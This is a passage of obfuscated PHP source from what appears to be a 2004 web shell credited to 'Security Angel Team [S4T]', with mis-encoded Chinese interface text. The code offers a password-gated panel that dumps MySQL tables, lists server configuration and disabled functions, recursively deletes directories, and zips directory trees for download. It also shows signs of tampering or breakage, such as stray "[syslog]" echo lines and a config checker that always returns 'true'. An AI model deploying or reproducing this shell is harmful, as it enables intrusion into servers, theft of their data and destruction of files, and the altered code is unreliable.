$spb97dac->makeinput('servername', $spd750e1, '', 'text', '20') . ' User: ' . $spb97dac->makeinput('dbusername', $sp3d4c98, '', 'text', '15') . ' Pass: ' . $spb97dac->makeinput('dbpassword', $sp26bfb3, '', 'text', '15') . ' DB: ' . $spb97dac->makeinput('dbname', $sp21feae, '', 'text', '15') . ' ' . $spb97dac->makeinput('connect', '����', '', 'submit')); @mysql_connect($spd750e1, $sp3d4c98, $sp26bfb3) and @mysql_select_db($sp21feae); $sp34559a = @mysql_list_tables($sp21feae); while ($sp023e76 = @mysql_fetch_row($sp34559a)) { $sp04c33d[$sp023e76[0]] = $sp023e76[0]; } @mysql_free_result($sp34559a); if (empty($sp04c33d)) { $spb97dac->tdbody('<b>��û���������ݿ� or ��ǰ���ݿ�û���κ����ݱ�</b>'); } else { $spb97dac->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">��ѡ���:</td><td>' . $spb97dac->makeselect(array('name' => 'table[]', 'option' => $sp04c33d, 'multiple' => 1, 'size' => 15, 'css' => 1)) . '</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> ���������������·��:</td><td>' . $spb97dac->makeinput('path', $spf14094 . '/' . $_SERVER['HTTP_HOST'] . '_MySQL.sql', '', 'text', '50') . '</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> ֱ�����ص����� (�ʺ���������С�����ݿ�)</td></tr></table>'); $spb97dac->makehidden('do', 'backupmysql'); $spb97dac->formfooter('0', '30'); } $spb97dac->tablefooter(); @mysql_close(); } elseif ($_GET['action'] == 'phpenv') { $spffd2d6 = 'true'; if ($spdf5b3d == '') { $spdf5b3d = 'No'; } else { $spdf5b3d = str_replace(' ', '<br>', $spdf5b3d); $spdf5b3d = str_replace(',', '<br>', $spdf5b3d); } $spc3310d = !preg_match('phpinfo', $spdf5b3d) ? 'Yes' : 'No'; $sp343538 = array(0 => array('������ʱ��', date('Y��m��d�� h:i:s', time())), 1 => array('����������', '<a href="http://' . $_SERVER['SERVER_NAME'] . '" target="_blank">' . $_SERVER['SERVER_NAME'] . '</a>'), 2 => array('������IP��ַ', gethostbyname($_SERVER['SERVER_NAME'])), 3 => array('����������ϵͳ', PHP_OS), 5 => array('����������ϵͳ���ֱ���', $_SERVER['HTTP_ACCEPT_LANGUAGE']), 6 => array('��������������', $_SERVER['SERVER_SOFTWARE']), 7 => array('Web����˿�', $_SERVER['SERVER_PORT']), 8 => array('PHP���з�ʽ', strtoupper(php_sapi_name())), 9 => array('PHP�汾', PHP_VERSION), 10 => array('�����ڰ�ȫģʽ', getphpcfg('safemode')), 11 => array('����������Ա', $sp9a82c5), 12 => array('���ļ�·��', __FILE__), 13 => array('����ʹ�� URL ���ļ� allow_url_fopen', getphpcfg('allow_url_fopen')), 14 => array('������̬�������ӿ� enable_dl', getphpcfg('enable_dl')), 15 => array('��ʾ������Ϣ display_errors', getphpcfg('display_errors')), 16 => array('�Զ�����ȫ�ֱ��� register_globals', getphpcfg('register_globals')), 17 => array('magic_quotes_gpc', getphpcfg('magic_quotes_gpc')), 18 => array('�����������ʹ���ڴ��� memory_limit', getphpcfg('memory_limit')), 19 => array('POST����ֽ��� post_max_size', getphpcfg('post_max_size')), 20 => array('��������ϴ��ļ� upload_max_filesize', $spffd2d6), 21 => array('���������ʱ�� max_execution_time', getphpcfg('max_execution_time') . '��'), 22 => array('�����õĺ��� disable_functions', $spdf5b3d), 23 => array('phpinfo()', $spc3310d), 24 => array('Ŀǰ���п���ռ�diskfreespace', intval(diskfreespace('.') / (1024 * 1024)) . 'Mb'), 25 => array('ͼ�δ��� GD Library', getfun('imageline')), 26 => array('IMAP�����ʼ�ϵͳ', getfun('imap_close')), 27 => array('MySQL���ݿ�', getfun('mysql_close')), 28 => array('SyBase���ݿ�', getfun('sybase_close')), 29 => array('Oracle���ݿ�', getfun('ora_close')), 30 => array('Oracle 8 ���ݿ�', getfun('OCILogOff')), 31 => array('PREL�����﷨ PCRE', getfun('preg_match')), 32 => array('PDF�ĵ�֧��', getfun('pdf_close')), 33 => array('Postgre SQL���ݿ�', getfun('pg_close')), 34 => array('SNMP�������Э��', getfun('snmpget')), 35 => array('ѹ���ļ�֧��(Zlib)', getfun('gzclose')), 36 => array('XML����', getfun('xml_set_object')), 37 => array('FTP', getfun('ftp_login')), 38 => array('ODBC���ݿ�����', getfun('odbc_close')), 39 => array('Session֧��', getfun('session_start')), 40 => array('Socket֧��', getfun('fsockopen'))); $spb97dac->tableheader(); echo '<form action="?action=phpenv" method="POST">
'; $spb97dac->tdbody('<b>�鿴PHP���ò���״��</b>', 'left', '1', '30', 'style="padding-left: 5px;"'); $spb97dac->tdbody('���������ò���(��:magic_quotes_gpc): ' . $spb97dac->makeinput('phpvarname', '', '', 'text', '40') . ' ' . $spb97dac->makeinput('', '�鿴', '', 'submit'), 'left', '2', '30', 'style="padding-left: 5px;"'); $spb97dac->makehidden('do', 'viewphpvar'); echo '</form>
'; $sp5653aa = array(0 => '����������', 1 => 'PHP��������', 2 => '���֧��״��'); for ($sp62a453 = 0; $sp62a453 < 3; $sp62a453++) { $spb97dac->tdbody('<b>' . $sp5653aa[1] . '</b>', 'left', '1', '30', 'style="padding-left: 5px;"'); ?>
  <tr class="secondalt">
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?php  if ($sp62a453 == 0) { for ($spc58e00 = 0; $spc58e00 <= 12; $spc58e00++) { echo '<tr><td width=40% style="padding-left: 5px;">' . $sp343538[$spc58e00][0] . '</td><td>' . $sp343538[$spc58e00][1] . '</td></tr>
'; } } elseif ($sp62a453 == 1) { for ($spc58e00 = 13; $spc58e00 <= 24; $spc58e00++) { echo '<tr><td width=40% style="padding-left: 5px;">' . $sp343538[$spc58e00][0] . '</td><td>' . $sp343538[$spc58e00][1] . '</td></tr>
'; } } elseif ($sp62a453 == 2) { for ($spc58e00 = 25; $spc58e00 <= 40; $spc58e00++) { echo '<tr><td width=40% style="padding-left: 5px;">' . $sp343538[$spc58e00][0] . '</td><td>' . $sp343538[$spc58e00][1] . '</td></tr>
'; } } ?>
      </table>
    </td>
  </tr>
<?php  } echo '</table>'; } ?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
  <tr>
    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
    <td align="right"><?php  debuginfo(); ob_end_flush(); ?>
</td>
  </tr>
</table>
</center>
</body>
</html>

<?php  function loginpage() { ?>
<style type="text/css">
input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}
</style>
<form method="POST" action="">
<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
<input type="hidden" name="do" value="login">
<input type="submit" value="Login">
</form>
<?php  die; } function debuginfo() { global $spb73b62; $sp0e01a1 = explode(' ', microtime()); $spab7449 = number_format($sp0e01a1[1] + $sp0e01a1[0] - $spb73b62, 6); echo "Processed in {$spab7449} second(s)"; } function stripslashes_array(&$spdace5e) { while (list($sp842826, $spb00cc1) = each($spdace5e)) { if ($sp842826 != 'argc' && $sp842826 != 'argv' && (strtoupper($sp842826) != $sp842826 || '' . intval($sp842826) == "{$sp842826}")) { if (is_string($spb00cc1)) { $spdace5e[$sp842826] = stripslashes($spb00cc1); } if (is_array($spb00cc1)) { $spdace5e[$sp842826] = stripslashes_array($spb00cc1); } } } return $spdace5e; } function deltree($spe59e39) { $sp90a280 = @dir($spe59e39); while ($sp8f7201 = $sp90a280->read()) { if (is_dir("{$spe59e39}/{$sp8f7201}") and $sp8f7201 != '.' and $sp8f7201 != '..') { @chmod("{$spe59e39}/{$sp8f7201}", 511); deltree("{$spe59e39}/{$sp8f7201}"); } if (is_file("{$spe59e39}/{$sp8f7201}")) { @chmod("{$spe59e39}/{$sp8f7201}", 511); @unlink("{$spe59e39}/{$sp8f7201}"); } } $sp90a280->close(); @chmod("{$spe59e39}", 511); return @rmdir($spe59e39) ? 1 : 0; } function dir_writeable($sp8c9f8e) { if (!is_dir($sp8c9f8e)) { @mkdir($sp8c9f8e, 511); } if (is_dir($sp8c9f8e)) { if ($spe2e680 = @fopen("{$sp8c9f8e}/test.txt", 'w')) { @fclose($spe2e680); @unlink("{$sp8c9f8e}/test.txt"); $spa02c0d = 1; } else { $spa02c0d = 0; } } return $spa02c0d; } function getrowbg() { global $sp0b9d6e; if ($sp0b9d6e++ % 2 == 0) { return 'firstalt'; } else { return 'secondalt'; } } function getPath($sp01369e, $sp2aa953) { global $sp8c9f8e; $sp6bf6bf = explode('/', $sp01369e); $sp98d19d = explode('/', $sp2aa953); $sp4d2488 = count($sp98d19d); for ($spc58e00 = 0; $spc58e00 < $sp4d2488; $spc58e00++) { if ($sp98d19d[$spc58e00] == '.' || $sp98d19d[$spc58e00] == '') { continue; } if ($sp98d19d[$spc58e00] == '..') { $spd39161 = count($sp6bf6bf); unset($sp6bf6bf[$spd39161 - 1]); continue; } $sp6bf6bf[count($sp6bf6bf)] = $sp98d19d[$spc58e00]; } return implode('/', $sp6bf6bf); } function getphpcfg($spc72f40) { switch ($sp3b8eaf = 'true') { case 0: return 'No'; break; case 1: return 'Yes'; break; default: return $sp3b8eaf; break; } } echo '[syslog]04
'; function getfun($sp9df47f) { return false !== function_exists($sp9df47f) ? 'Yes' : 'No'; } class PHPZip { var $out = ''; function PHPZip($sp8c9f8e) { if (@function_exists('gzcompress')) { $sp79f04a = getcwd(); if (is_array($sp8c9f8e)) { $spb7736e = $sp8c9f8e; } else { $spb7736e = $this->GetFileList($sp8c9f8e); foreach ($spb7736e as $spf38c9d => $spc85aba) { $spb7736e[] = substr($spc85aba, strlen($sp8c9f8e) + 1); } } if (!empty($sp8c9f8e) && !is_array($sp8c9f8e) && file_exists($sp8c9f8e)) { chdir($sp8c9f8e); } else { chdir($sp79f04a); } if (count($spb7736e) > 0) { foreach ($spb7736e as $sp387cde) { if (is_file($sp387cde)) { $spd842ec = fopen($sp387cde, 'r'); $sp15c035 = @fread($spd842ec, filesize($sp387cde)); fclose($spd842ec); if (is_array($sp8c9f8e)) { $sp387cde = basename($sp387cde); } $this->addFile($sp15c035, $sp387cde); } } $this->out = $this->file(); chdir($sp79f04a); } return 1; } else { return 0; } } function GetFileList($sp8c9f8e) { static $sp62a453; if (is_dir($sp8c9f8e)) { if ($sp20d972 = opendir($sp8c9f8e)) { while (($sp8f7201 = readdir($sp20d972)) !== false) { if ($sp8f7201 != '.' && $sp8f7201 != '..') { $sp77bd8d = $sp8c9f8e . '/' . $sp8f7201; if (is_dir($sp77bd8d)) { $this->GetFileList($sp77bd8d); } $sp62a453[] = $sp77bd8d; } } closedir($sp20d972); } } return $sp62a453; } var $datasec = array(); var $ctrl_dir = array(); var $eof_ctrl_dir = 'PK    '; var $old_offset = 0; function unix2DosTime($sp9b961f = 0) { $spafd6a4 = $sp9b961f == 0 ? getdate() : getdate($sp9b961f); if ($spafd6a4['year'] < 1980) { $spafd6a4['year'] = 1980; $spafd6a4['mon'] = 1; $spafd6a4['mday'] = 1; $spafd6a4['hours'] = 0; $spafd6a4['minutes'] = 0; $spafd6a4['seconds'] = 0; } return $spafd6a4['year'] - 1980 << 25 | $spafd6a4['mon'] << 21 | $spafd6a4['mday'] << 16 | $spafd6a4['hours'] << 11 | $spafd6a4['minutes'] << 5 | $spafd6a4['seconds'] >> 1; } function addFile($sp8dce42, $sp6ee69e, $spb523b8 = 0) { $sp6ee69e = str_replace('\\', '/', $sp6ee69e); $sp358214 = dechex($this->unix2DosTime($spb523b8)); $sp798007 = '\\x' . $sp358214[6] . $sp358214[7] . '\\x' . $sp358214[4] . $sp358214[5] . '\\x' . $sp358214[2] . $sp358214[3] . '\\x' . $sp358214[0] . $sp358214[1]; eval('$hexdtime = "' . $sp798007 . '";'); $sp2b47d0 = 'PK'; $sp2b47d0 .= ' '; $sp2b47d0 .= '  '; $sp2b47d0 .= ' '; $sp2b47d0 .= $sp798007; $sp7ac9c6 = strlen($sp8dce42); $spbddd56 = crc32($sp8dce42); $sp214ded = gzcompress($sp8dce42); $sp188ed7 = strlen($sp214ded); $sp214ded = substr(substr($sp214ded, 0, strlen($sp214ded) - 4), 2); $sp2b47d0 .= pack('V', $spbddd56); $sp2b47d0 .= pack('V', $sp188ed7); $sp2b47d0 .= pack('V', $sp7ac9c6); $sp2b47d0 .= pack('v', strlen($sp6ee69e)); $sp2b47d0 .= pack('v', 0); $sp2b47d0 .= $sp6ee69e; $sp2b47d0 .= $sp214ded; $sp2b47d0 .= pack('V', $spbddd56); $sp2b47d0 .= pack('V', $sp188ed7); $sp2b47d0 .= pack('V', $sp7ac9c6); $this->datasec[] = $sp2b47d0; $spab65fc = strlen(implode('', $this->datasec)); $sp0c45d6 = 'PK'; $sp0c45d6 .= '  '; $sp0c45d6 .= ' '; $sp0c45d6 .= '  '; $sp0c45d6 .= ' '; $sp0c45d6 .= $sp798007; $sp0c45d6 .= pack('V', $spbddd56); $sp0c45d6 .= pack('V', $sp188ed7); $sp0c45d6 .= pack('V', $sp7ac9c6); $sp0c45d6 .= pack('v', strlen($sp6ee69e)); $sp0c45d6 .= pack('v', 0); $sp0c45d6 .= pack('v', 0); $sp0c45d6 .= pack('v', 0); $sp0c45d6 .= pack('v', 0); $sp0c45d6 .= pack('V', 32); $sp0c45d6 .= pack('V', $this->old_offset); $this->old_offset = $spab65fc; $sp0c45d6 .= $sp6ee69e; $this->ctrl_dir[] = $sp0c45d6; } function file() { $sp8dce42 = implode('', $this->datasec); $sp9a694e = implode('', $this->ctrl_dir); return $sp8dce42 . $sp9a694e . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($sp9a694e)) . pack('V', strlen($sp8dce42)) . '  '; } } echo '[syslog]05
'; function sqldumptable($sp023e76, $spe2e680 = 0) { $spd6b4ad = "DROP TABLE IF EXISTS {$sp023e76};\n"; $spd6b4ad .= "CREATE TABLE {$sp023e76} (\n"; $sp835523 = 1; $speb3436 = mysql_query("SHOW FIELDS FROM {$sp023e76}"); while ($spfb39ee = mysql_fetch_array($speb3436)) { if (!$sp835523) { $spd6b4ad .= ',
'; } else { $sp835523 = 0; } $spd6b4ad .= "   {$spfb39ee['Field']} {$spfb39ee['Type']}"; if (!empty($spfb39ee['Default'])) { $spd6b4ad .= " DEFAULT '{$spfb39ee['Default']}'"; } if ($spfb39ee['Null'] != 'YES') { $spd6b4ad .= ' NOT NULL'; } if ($spfb39ee['Extra'] != '') { $spd6b4ad .= " {$spfb39ee['Extra']}"; } } mysql_free_result($speb3436); $spd31430 = mysql_query("SHOW KEYS FROM {$sp023e76}"); while ($sp842826 = mysql_fetch_array($spd31430)) { $spe31425 = $sp842826['Key_name']; if ($spe31425 != 'PRIMARY' and $sp842826['Non_unique'] == 0) { $spe31425 = "UNIQUE|{$spe31425}"; } if (!is_array($sp5587cc[$spe31425])) { $sp5587cc[$spe31425] = array(); } $sp5587cc[$spe31425][] = $sp842826['Column_name']; } mysql_free_result($spd31430); while (list($spe31425, $sp32ca6d) = @each($sp5587cc)) { $spd6b4ad .= ',
'; $spc80fcf = implode($sp32ca6d, ','); if ($spe31425 == 'PRIMARY') { $spd6b4ad .= "   PRIMARY KEY ({$spc80fcf})"; } else { if (substr($spe31425, 0, 6) == 'UNIQUE') { $spe31425 = substr($spe31425, 7); } $spd6b4ad .= "   KEY {$spe31425} ({$spc80fcf})"; } } $spd6b4ad .= '
);

'; if ($spe2e680) { fwrite($spe2e680, $spd6b4ad); } else { echo $spd6b4ad; } $sp1098b7 = mysql_query("SELECT * FROM {$sp023e76}"); $sp5863d8 = mysql_num_fields($sp1098b7); while ($spfe8f01 = mysql_fetch_array($sp1098b7)) { $spd6b4ad = "INSERT INTO {$sp023e76} VALUES("; $sp124305 = -1; $sp835523 = 1; while (++$sp124305 < $sp5863d8) { if (!$sp835523) { $spd6b4ad .= ', '; } else { $sp835523 = 0; } if (!isset($spfe8f01[$sp124305])) { $spd6b4ad .= 'NULL'; } else { $spd6b4ad .= '\'' . mysql_escape_string($spfe8f01[$sp124305]) . '\''; } } $spd6b4ad .= ');
'; if ($spe2e680) { fwrite($spe2e680, $spd6b4ad); } else { echo $spd6b4ad; } } mysql_free_result($sp1098b7); } class FORMS { function tableheader() { echo '<table width="775" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
'; } function headerform($spa77579 = array()) { global $sp8c9f8e; if ($spa77579[enctype]) { $sp0d12a9 = "enctype=\"{$spa77579['enctype']}\""; } else { $sp0d12a9 = ''; } if (!isset($spa77579[method])) { $spa77579[method] = 'POST'; } if (!isset($spa77579[action])) { $spa77579[action] = ''; } echo '  <form action="' . $spa77579[action] . '" method="' . $spa77579[method] . "\" {$sp0d12a9}>\n"; echo '  <tr>
'; echo '    <td>' . $spa77579[content] . '</td>
'; echo '  </tr>
'; echo '  </form>
'; } function tdheader($spf6991e) { global $sp8c9f8e; echo '  <tr class="firstalt">
'; echo '	<td align="center"><b>' . $spf6991e . ' [<a href="?dir=' . urlencode($sp8c9f8e) . '">����</a>]</b></td>
'; echo '  </tr>
'; } function tdbody($sp15c035, $spe1e2ef = 'center', $sp2fe34c = '2', $spa5cd8e = '', $sp31bf22 = '', $sp3bf788 = '') { if ($sp2fe34c == '2') { $sp3e16da = 'secondalt'; } elseif ($sp2fe34c == '1') { $sp3e16da = 'firstalt'; } else { $sp3e16da = $sp2fe34c; } $spa5cd8e = empty($spa5cd8e) ? '' : ' height=' . $spa5cd8e; $sp3bf788 = empty($sp3bf788) ? '' : ' colspan=' . $sp3bf788; echo '  <tr class="' . $sp3e16da . '">
'; echo '	<td align="' . $spe1e2ef . '"' . $spa5cd8e . ' ' . $sp3bf788 . ' ' . $sp31bf22 . '>' . $sp15c035 . '</td>
'; echo '  </tr>
'; } function tablefooter() { echo '</table>
'; } function formheader($sp581fdf = '', $spf6991e, $sp1c8613 = '') { global $sp8c9f8e; $sp1c8613 = empty($sp1c8613) ? '' : ' target="' . $sp1c8613 . '"'; echo " <form action=\"{$sp581fdf}\" method=\"POST\"" . $sp1c8613 . '>
'; echo '  <tr class="firstalt">
'; echo '	<td align="center"><b>' . $spf6991e . ' [<a href="?dir=' . urlencode($sp8c9f8e) . '">����</a>]</b></td>
'; echo '  </tr>
'; } function makehidden($sp6ee69e, $sp0945f4 = '') { echo "<input type=\"hidden\" name=\"{$sp6ee69e}\" value=\"{$sp0945f4}\">\n"; } function makeinput($sp6ee69e, $sp0945f4 = '', $sp31bf22 = '', $spf661d7 = 'text', $sp1763a0 = '30', $sp3e16da = 'input') { $sp3e16da = $sp3e16da == 'input' ? ' class="input"' : ''; $spbc20d1 = "<input name=\"{$sp6ee69e}\" value=\"{$sp0945f4}\" type=\"{$spf661d7}\" " . $sp3e16da . " size=\"{$sp1763a0}\" {$sp31bf22}>\n"; return $spbc20d1; } function maketextarea($sp6ee69e, $sp15c035 = '', $speaf78f = '100', $sp1098b7 = '20', $sp31bf22 = '') { $sp58a42e = '<textarea name="' . $sp6ee69e . '" cols="' . $speaf78f . '" rows="' . $sp1098b7 . '" ' . $sp31bf22 . '>' . $sp15c035 . '</textarea>
'; return $sp58a42e; } function formfooter($sp766197 = '', $spa5cd8e = '') { $spa5cd8e = empty($spa5cd8e) ? '' : ' height="' . $spa5cd8e . '"'; echo '  <tr class="secondalt">
'; echo '	<td align="center"' . $spa5cd8e . '><input class="input" type="submit" value="ȷ��"></td>
'; echo '  </tr>
'; echo ' </form>
'; echo $spb08a3c = empty($sp766197) ? '' : '</table>
'; } function makeselect($spa77579 = array()) { if ($spa77579[multiple] == 1) { $sp05968e = ' multiple'; if ($spa77579[size] > 0) { $sp1763a0 = "size={$spa77579['size']}"; } } if ($spa77579[css] == 0) { $sp3e16da = 'class="input"'; } $sp780f4b = "<select {$sp3e16da} name=\"{$spa77579['name']}\"{$sp05968e} {$sp1763a0}>\n"; if (is_array($spa77579[option])) { foreach ($spa77579[option] as $sp842826 => $sp0945f4) { if (!is_array($spa77579[selected])) { if ($spa77579[selected] == $sp842826) { $sp780f4b .= "<option value=\"{$sp842826}\" selected>{$sp0945f4}</option>\n"; } else { $sp780f4b .= "<option value=\"{$sp842826}\">{$sp0945f4}</option>\n"; } } elseif (is_array($spa77579[selected])) { if ($spa77579[selected][$sp842826] == 1) { $sp780f4b .= "<option value=\"{$sp842826}\" selected>{$sp0945f4}</option>\n"; } else { $sp780f4b .= "<option value=\"{$sp842826}\">{$sp0945f4}</option>\n"; } } } } $sp780f4b .= '</select>
'; return $sp780f4b; } } echo '[syslog]07
';